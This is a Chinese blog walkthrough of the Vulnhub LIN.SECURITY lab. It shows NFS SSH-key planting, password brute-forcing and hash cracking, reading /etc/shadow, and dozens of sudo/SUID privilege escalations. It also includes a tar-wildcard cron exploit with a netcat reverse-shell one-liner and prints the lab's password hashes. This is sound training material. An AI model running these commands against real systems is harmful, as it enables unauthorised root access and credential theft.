---
title: LIN.SECURITY:1
author: hgbe02
date: 2024-02-25 20:00:00 +0800
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Lin-security.html"
---

# LIN.SECURITY: 1

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151383.png" alt="image-20240224192920849" style="zoom: 33%;" />

## 配置网卡

靶场配置为`NAT`，尝试扫描：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151385.png" alt="image-20240224193122225" style="zoom: 67%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151386.png" alt="image-20240224193202814" style="zoom: 67%;" />

没扫出来，看一下描述，给出了一个低权限账号，尝试登录：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151387.png" alt="image-20240224193558142" style="zoom:50%;" />

获取到了IP，但是总感觉不太对，先扫描一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151388.png" alt="image-20240224193711085" style="zoom: 50%;" />

ping不通，扫也扫不出来，啥情况，重新打开配置网卡试试：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151389.png" alt="image-20240224194039610" style="zoom:50%;" />

这种情况往往是vmware的版本太高了，尝试兼容性改低一点：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151390.png" alt="image-20240224194148319" style="zoom: 33%;" />

打开没有选项的话，先点击，等到右边出现相关配置且关机的时候，再右键左边的虚拟机：

![image-20240224194313319](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151391.png)

原来刚刚搞成`vmware17.0`的了，现在可以正常配置网卡了，还是NAT，尝试打开看一下有无我们需要的：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151392.png" alt="image-20240224194510157" style="zoom:50%;" />

还是只有两个网卡，麻了。。。。一直扫不出来。。。去瞅瞅师傅们的wp看看有没有遇到这个问题，好像没有。。。。

尝试`virtualbox`打开看一下？

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151393.png" alt="image-20240224200909565" style="zoom:50%;" />

我擦，爽啊！！扫一下试试：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151394.png" alt="image-20240224202717952" style="zoom: 50%;" />

还是扫不到。。。。。只能参考[这个师傅](https://blog.csdn.net/qq_35782055/article/details/129654291)的blog了，再不行就算了，直接看wp学习了：

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
# "打不出来，使用shift+2可以打出来
secret
id
vim /etc/default/keyboard
# 将XKBLAYOUT改为us
vim /etc/netplan/50-cloud-init.yaml
# 将enp0s3改为ens33
setupcon
netplan apply
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151395.png" alt="image-20240224210031499" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151396.png" alt="image-20240224210152476" style="zoom:33%;" />

然后就可以扫到了！！！！师傅真是妙手神医啊！！！[丨Arcueid丨](https://blog.csdn.net/qq_35782055)师傅牛逼！！！！

## 信息搜集

### 端口扫描

```bash
nmap -sT -T4 -sV -p- 192.168.244.129
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-24 08:09 EST
Nmap scan report for 192.168.244.129
Host is up (0.0016s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs      3-4 (RPC #100003)
40999/tcp open  mountd   1-3 (RPC #100005)
41445/tcp open  nlockmgr 1-4 (RPC #100021)
46043/tcp open  mountd   1-3 (RPC #100005)
57797/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 漏洞利用

### 22端口（利用作者给的用户登录）

ssh 连接一下，在kali上做：

```bash
ssh bob@192.168.244.129
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151397.png" alt="image-20240224211401425" style="zoom:50%;" />

### 40999、46043、57797（利用共享目录获取权限）

都在运行`mountd`，尝试枚举一下：

```bash
┌──(kali㉿kali)-[~]
└─$ showmount -e 192.168.244.129
Export list for 192.168.244.129:
/home/peter *
```

没发现啥东西。。。创建一个本地目录用以挂载网络共享资源：

```bash
mdkir peter
sudo mount -t nfs 192.168.244.129:/home/peter ./peter -o nolock
# 参数"-o nolock"表示在挂载时不使用文件锁定机制，这意味着允许多个客户端同时对文件进行读写操作，但也可能导致数据一致性问题。
cd peter
ls -la
mkdir .ssh
stat peter
sudo useradd -u 1001 hack
sudo -u hack bash
#hack
cd peter
mkdir .ssh
cd ../;cp authorized_keys peter/.ssh/

# kali
ssh-keygen -t rsa -b 2048
pwd
sudo cp id_rsa.pub /home/kali/temp/authorized_keys
```

![image-20240224214458643](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151398.png)

```bash
ssh -l peter 192.168.244.129
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151399.png" alt="image-20240224214725210" style="zoom:50%;" />

## 提权

参考[GTFOBins](https://gtfobins.github.io/)，有很多linux权限提升的方法！！！！

### /etc/passwd(bob and peter)

直接读取`/etc/passwd`：

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin                                                                           
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin                                                                               
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
bob:x:1000:1004:bob:/home/bob:/bin/bash
statd:x:111:65534::/var/lib/nfs:/usr/sbin/nologin
peter:x:1001:1005:,,,:/home/peter:/bin/bash
insecurity:AzER3pBZh6WZE:0:0::/:/bin/sh          高权限用户且有密码hash值
susan:x:1002:1006:,,,:/home/susan:/bin/rbash
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151400.png" alt="image-20240224215948836" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151401.png" alt="image-20240224215859358" style="zoom:50%;" />

或者 kali 一站到底：

```bash
echo AzER3pBZh6WZE > hash | john hash --wordlist = /usr/share/wordlists/rockyou.txt 
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151402.png" alt="image-20240225001309318" style="zoom:50%;" />

得到密码，尝试登录：

```apl
insecurity
P@ssw0rd!
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151403.png" alt="image-20240224220427298" style="zoom:50%;" />

### 爆破出 bob 用户再提权(peter)

```bash
cat /etc/passwd
# 找到一些用户名丢进去爆破，这里直接放入bob和susan
echo -e "bob\nsusan" > flag.txt
hydra -L flag.txt -P /usr/share/seclists/Passwords/500-worst-passwords.txt 192.168.244.129 ssh -t 4
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151404.png" alt="image-20240225002852941" style="zoom:50%;" />

ssh连接一下，使用最简单的提权：

![image-20240225002646382](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151405.png)

### strace(peter) (NFS privilege escalation)

先查看一下`sudo -l`：

检索一下相关提权方法：`sudo strace -o /dev/null /bin/sh`

![image-20240225003045749](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151406.png)

### sudo -l

先使用`sudo -l`查看一下基础信息：

```bash
Matching Defaults entries for bob on linsecurity:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bob may run the following commands on linsecurity:
    (ALL) /bin/ash, /usr/bin/awk, /bin/bash, /bin/sh, /bin/csh, /usr/bin/curl, /bin/dash, /bin/ed, /usr/bin/env, /usr/bin/expect, /usr/bin/find, /usr/bin/ftp, /usr/bin/less, /usr/bin/man,
        /bin/more, /usr/bin/scp, /usr/bin/socat, /usr/bin/ssh, /usr/bin/vi, /usr/bin/zsh, /usr/bin/pico, /usr/bin/rvim, /usr/bin/perl, /usr/bin/tclsh, /usr/bin/git, /usr/bin/script, /usr/bin/scp
```

### ash(bob)

```shell
sudo ash
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151407.png" alt="image-20240224220834963" style="zoom:50%;" />

### awk(bob)

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151408.png" alt="image-20240224221053987" style="zoom:50%;" />

### bash(bob)

```bash
sudo bash
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151409.png" alt="image-20240224221221469" style="zoom: 50%;" />

### csh(bob)

```bash
sudo csh
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151410.png" alt="image-20240224223927353" style="zoom:50%;" />

### curl(bob)

```bash
sudo curl file:///etc/shadow
```

```text
root:$6$aorWKpxj$yOgku4F1ZRbqvSxxUtAYY2/6K/UU5wLobTSz/Pw5/ILvXgq9NibQ0/NQbOr1Wzp2bTbpNQr1jNNlaGjXDu5Yj1:17721:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7:::
games:*:17647:0:99999:7:::
man:*:17647:0:99999:7:::
lp:*:17647:0:99999:7:::
mail:*:17647:0:99999:7:::
news:*:17647:0:99999:7:::
uucp:*:17647:0:99999:7:::
proxy:*:17647:0:99999:7:::
www-data:*:17647:0:99999:7:::
backup:*:17647:0:99999:7:::
list:*:17647:0:99999:7:::
irc:*:17647:0:99999:7:::
gnats:*:17647:0:99999:7:::
nobody:*:17647:0:99999:7:::
systemd-network:*:17647:0:99999:7:::
systemd-resolve:*:17647:0:99999:7:::
syslog:*:17647:0:99999:7:::
messagebus:*:17647:0:99999:7:::
_apt:*:17647:0:99999:7:::
lxd:*:17647:0:99999:7:::
uuidd:*:17647:0:99999:7:::
dnsmasq:*:17647:0:99999:7:::
landscape:*:17647:0:99999:7:::
pollinate:*:17647:0:99999:7:::
sshd:*:17647:0:99999:7:::
bob:$6$Kk0DA.6Xha4nL2p5$jq7qoit2l4ckULg1ZxcbL5wUz2Ld2ZUa.RYaIMs.Lma0EFGheX9yCXfKy37K0GsHz50FYIqIESo4QXWL.DYTI0:17721:0:99999:7:::
statd:*:17721:0:99999:7:::
peter:$6$QpjS4vUG$Zi1KcJ7cRB8TJG9A/x7GhQQvJ0RoYwG4Jxj/6R58SJddU2X/QTQKNJWzwiByeTELKeyp0vS83kPsYITbTTmlb0:17721:0:99999:7:::
susan:$6$5oSmml7K$0joeavcuzw4qxDJ2LsD1ablUIrFhycVoIXL3rxN/3q2lVpQOKLufta5tqMRIh30Gb32IBp5yZ7XvBR6uX9/SR/:17721:0:99999:7:::
```

查看一下`root`密码：

```text
root:$6$aorWKpxj$yOgku4F1ZRbqvSxxUtAYY2/6K/UU5wLobTSz/Pw5/ILvXgq9NibQ0/NQbOr1Wzp2bTbpNQr1jNNlaGjXDu5Yj1:17721:0:99999:7:::
```

**用户名**：在这个例子中是 "root"，表示这是 root 用户的条目。

**密码哈希**：这个字段保存了用户的密码哈希值。在这个例子中，密码哈希是 `$6$aorWKpxj$yOgku4F1ZRbqvSxxUtAYY2/6K/UU5wLobTSz/Pw5/ILvXgq9NibQ0/NQbOr1Wzp2bTbpNQr1jNNlaGjXDu5Yj1`，它是经过加密处理的密码。

**上次修改日期**：这个字段表示自1970年1月1日起，距离上次修改密码的天数。在这个例子中，它是 "17721" 天。

**密码到期前警告天数**：这个字段表示密码过期前的警告天数。在这个例子中，它是 "0" 天。

**密码过期天数**：这个字段表示密码的最大有效期。在这个例子中，它是 "99999" 天，表示密码永不过期。

**密码过期日期**：这个字段表示自1970年1月1日起，密码过期的绝对日期。在这个例子中，它是 "7" 天，表示密码永不过期。

**账户失效日期**：这个字段表示自1970年1月1日起，账户失效的绝对日期。在这个例子中，它是空的，表示账户永不失效。

**保留字段**：这些字段目前没有被使用。

### dash(bob)

```bash
sudo dash
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151411.png" alt="image-20240224224654508" style="zoom:50%;" />

### ed(bob)

```bash
sudo ed
!/bin/sh
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151412.png" alt="image-20240224224843707" style="zoom:50%;" />

### env(bob)

```bash
sudo env /bin/sh
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151413.png" alt="image-20240224225009591" style="zoom:50%;" />

### expect(bob)

> expect是一个自动化交互套件，主要应用于执行命令和程序时，系统以交互形式要求输入指定字符串，实现交互通信。

```bash
sudo expect -c 'spawn /bin/sh;interact'
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151414.png" alt="image-20240224225351372" style="zoom:50%;" />

### find(bob)

```bash
sudo find . -exec /bin/sh \; -quit
# -quit前面的空格！！！
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151415.png" alt="image-20240224225532579" style="zoom:50%;" />

### ftp(bob)

```bash
sudo ftp
!/bin/sh
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151416.png" alt="image-20240224225833328" style="zoom:67%;" />

### Less(bob)

> less 与 more 类似，但使用 less 可以随意浏览文件，而 more 仅能向前移动，却不能向后移动，而且 less 在查看之前不会加载整个文件。

```bash
sudo less /etc/passwd
!/bin/sh
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151417.png" alt="image-20240224230427559" style="zoom:50%;" />

### Man(bob)

> Linux提供了丰富的帮助手册，当你需要查看某个命令的参数时不必到处上网查找，只要man一下即可。可以使用man man 查看man的使用方法。

```bash
sudo man man
!/bin/sh
```

![image-20240224230527628](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151418.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151419.png" alt="image-20240224230545762" style="zoom:50%;" />

### More(bob)

> Linux more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。

```bash
TERM = sudo more /etc/profile
!/bin/sh
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151420.png" alt="image-20240224231201762" style="zoom:50%;" />

### Scp(bob)

> scp 是 secure copy 的缩写, scp 是 linux 系统下基于 ssh 登陆进行安全的远程文件拷贝命令。
>
> scp 是加密的，rcp 是不加密的，scp 是 rcp 的加强版。

```bash
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
sudo scp -S $TF x y:
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151421.png" alt="image-20240224231450895" style="zoom:50%;" />

### socat(bob)

`socat`是一个多功能的网络工具，名字来由是`Socket CAT`，可以看作是`netcat`的加强版。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151423.png" alt="image-20240224231726189" style="zoom: 50%;" />

也可以：

```shell
sudo socat TCP-LISTEN:8888,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
socat FILE:`tty`,raw,echo=0 TCP:127.0.0.1:8888
```

![image-20240224233647333](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151424.png)

### ssh(bob)

```shell
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151425.png" alt="image-20240224233931083" style="zoom:50%;" />

### vi(bob)

```bash
sudo vi -c ':!/bin/sh' /dev/null
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151426.png" alt="image-20240224234118791" style="zoom:50%;" />

### zsh(bob)

```bash
sudo zsh
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151427.png" alt="image-20240224234210530" style="zoom:50%;" />

### pico(bob)

> Linux pico命令用于编辑文字文件。
>
> pico是个简单易用、以显示导向为主的文字编辑程序，它伴随着处理电子邮件和新闻组的程序pine而来。

#### shell1

```bash
pico
^R^X    # ctrl+R ctrl+X
reset; sh 1>&0 2>&0
```

![image-20240224234627591](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151428.png)

这里需要`sudo`一下：

```bash
sudo pico
^R^X    # ctrl+R ctrl+X
reset; sh 1>&0 2>&0
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151429.png" alt="image-20240224235127917" style="zoom: 67%;" />

#### shell2

```bash
sudo pico -s /bin/sh
/bin/sh
^T   # ctrl+T
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151430.png" alt="image-20240224234703997" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151431.png" alt="image-20240224234845566" style="zoom:50%;" />

### rvim(bob)

> 这需要 rvim 使用Python支持进行编译。前置：py3为Python3

```bash
sudo rvim -c ':python3 import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151432.png" alt="image-20240224235236310" style="zoom:50%;" />

### perl(bob)

```bash
sudo perl -e 'exec "/bin/sh";'
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151433.png" alt="image-20240224235437656" style="zoom:50%;" />

### tclsh(bob)

`tclsh`是Tcl（Tool Command Language）的解释器，用于执行 Tcl 脚本。Tcl是一种通用的脚本语言，它被设计用来编写各种类型的程序，包括系统管理脚本、图形界面程序、网络应用程序等。Tcl脚本可以在各种操作系统上运行，包括Linux、Unix、Windows等。

```bash
sudo tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151434.png" alt="image-20240224235705249" style="zoom:50%;" />

### git(bob)

```bash
sudo git -p help config
!/bin/sh
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151435.png" alt="image-20240224235931887" style="zoom:67%;" />

### script(bob)

```bash
sudo script -q /dev/null
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151436.png" alt="image-20240225000108698" style="zoom:50%;" />

### 定时任务提权(bob)

```bash
cat /etc/crontab
cat /etc/cron.daily/backup
echo "mkfifo /tmp/sfnirht; nc 192.168.244.128 1234 0</tmp/sfnirht | /bin/sh >/tmp/sfnirht 2>&1; rm /tmp/sfnirht" > shell.sh && chmod +x shell.sh
echo > "--checkpoint-action=exec=sh shell.sh"
echo > "--checkpoint=1"

# kali
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.244.128 lport=1234
# mkfifo /tmp/sfnirht; nc 192.168.244.128 1234 0</tmp/sfnirht | /bin/sh >/tmp/sfnirht 2>&1; rm /tmp/sfnirht
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151437.png" alt="image-20240225004916435" style="zoom:50%;" />

### docker提权(peter)

```bash
groups
peter docker
```

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151438.png" alt="image-20240225011855018" style="zoom:50%;" />

### 隐藏文件+SID提权（bob->susan->root）

寻找一下隐藏文件，看看有没有可以利用的：

```bash
find . -type f -name ".*"
# ls -alR /home
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151439.png" alt="image-20240225013016913" style="zoom:50%;" />

看到一个`.secret`可能有用，看一下是啥，尝试登录到susan上去：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151440.png" alt="image-20240225013346414" style="zoom:50%;" />

成功！！！！

查看一下`SID`程序有哪些：

```bash
find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null
```

```text
-rwsr-xr-x 1 root root 40152 Nov 30  2017 /snap/core/4917/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/4917/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/4917/bin/ping6
-rwsr-xr-x 1 root root 40128 May 17  2017 /snap/core/4917/bin/su
-rwsr-xr-x 1 root root 27608 Nov 30  2017 /snap/core/4917/bin/umount
-rwsr-xr-x 1 root root 71824 May 17  2017 /snap/core/4917/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 May 17  2017 /snap/core/4917/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 May 17  2017 /snap/core/4917/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 May 17  2017 /snap/core/4917/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 May 17  2017 /snap/core/4917/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /snap/core/4917/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jan 12  2017 /snap/core/4917/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Jan 18  2018 /snap/core/4917/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 98440 Jun 21  2018 /snap/core/4917/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 390888 Jan 29  2016 /snap/core/4917/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 Nov 30  2017 /snap/core/4486/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/4486/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/4486/bin/ping6
-rwsr-xr-x 1 root root 40128 May 17  2017 /snap/core/4486/bin/su
-rwsr-xr-x 1 root root 27608 Nov 30  2017 /snap/core/4486/bin/umount
-rwsr-xr-x 1 root root 71824 May 17  2017 /snap/core/4486/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 May 17  2017 /snap/core/4486/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 May 17  2017 /snap/core/4486/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 May 17  2017 /snap/core/4486/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 May 17  2017 /snap/core/4486/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /snap/core/4486/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jan 12  2017 /snap/core/4486/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Jan 18  2018 /snap/core/4486/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 94344 Apr 16  2018 /snap/core/4486/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 390888 Jan 29  2016 /snap/core/4486/usr/sbin/pppd
-rwsr-xr-x 1 root root 64424 Mar  9  2017 /bin/ping
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 26696 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 146128 Nov 30  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 44664 Jan 25  2018 /bin/su
-rwsr-xr-x 1 root root 43088 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 22520 Mar 27  2018 /usr/bin/pkexec
-rwsr-xr-x 1 root root 18640 Oct 27  2016 /usr/bin/netkit-rlogin
-rwsr-x--- 1 root itservices 18552 Apr 10  2018 /usr/bin/xxd      -->xxd 命令用于使用二进制或十六进制格式显示文件内容
-rwsr-xr-x 1 root root 37136 Jan 25  2018 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 40344 Jan 25  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 149080 Jan 18  2018 /usr/bin/sudo
-rwsr-xr-x 1 root root 22728 Oct 27  2016 /usr/bin/netkit-rcp
-rwsr-xr-x 1 root root 76496 Jan 25  2018 /usr/bin/chfn
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 75824 Jan 25  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44528 Jan 25  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 18448 Mar  9  2017 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 37136 Jan 25  2018 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 14504 Oct 27  2016 /usr/bin/netkit-rsh
-rwsr-sr-x 1 root root 30800 May 16  2018 /usr/bin/taskset
-rwsr-xr-x 1 root root 59640 Jan 25  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42992 Nov 15  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 80056 Jun  5  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 436552 Feb 10  2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14328 Mar 27  2018 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root root 101208 May 16  2018 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 113336 Jan 16  2018 /sbin/mount.nfs
```

使用`xxd`命令读取`shadow`：

```bash
xxd /etc/shadow | xxd -r
```

尝试破译`root`的密码：

```bash
# kali
echo 'root:$6$aorWKpxj$yOgku4F1ZRbqvSxxUtAYY2/6K/UU5wLobTSz/Pw5/ILvXgq9NibQ0/NQbOr1Wzp2bTbpNQr1jNNlaGjXDu5Yj1:17721:0:99999:7:::' > flag.txt   
# 只能是单引号，双引号不行！！！！
john flag.txt --wordlist=/usr/share/wordlists/rockyou.txt 
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151441.png" alt="image-20240225014300677" style="zoom:50%;" />

尝试登录：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402250151442.png" alt="image-20240225014448067" style="zoom:50%;" />

成功！！！！

### SUID提权(bob and peter)

先查找一下SUID文件有哪些：

```bash
find / -perm -u=s -type f 2>/dev/null
```

```text
/snap/core/4917/bin/mount
/snap/core/4917/bin/ping
/snap/core/4917/bin/ping6
/snap/core/4917/bin/su
/snap/core/4917/bin/umount
/snap/core/4917/usr/bin/chfn
/snap/core/4917/usr/bin/chsh
/snap/core/4917/usr/bin/gpasswd
/snap/core/4917/usr/bin/newgrp
/snap/core/4917/usr/bin/passwd
/snap/core/4917/usr/bin/sudo
/snap/core/4917/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/4917/usr/lib/openssh/ssh-keysign
/snap/core/4917/usr/lib/snapd/snap-confine
/snap/core/4917/usr/sbin/pppd
/snap/core/4486/bin/mount
/snap/core/4486/bin/ping
/snap/core/4486/bin/ping6
/snap/core/4486/bin/su
/snap/core/4486/bin/umount
/snap/core/4486/usr/bin/chfn
/snap/core/4486/usr/bin/chsh
/snap/core/4486/usr/bin/gpasswd
/snap/core/4486/usr/bin/newgrp
/snap/core/4486/usr/bin/passwd
/snap/core/4486/usr/bin/sudo
/snap/core/4486/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/4486/usr/lib/openssh/ssh-keysign
/snap/core/4486/usr/lib/snapd/snap-confine
/snap/core/4486/usr/sbin/pppd
/bin/ping
/bin/fusermount
/bin/umount
/bin/ntfs-3g
/bin/su
/bin/mount
/usr/bin/pkexec
/usr/bin/netkit-rlogin
/usr/bin/xxd
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/netkit-rcp
/usr/bin/chfn
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/chsh
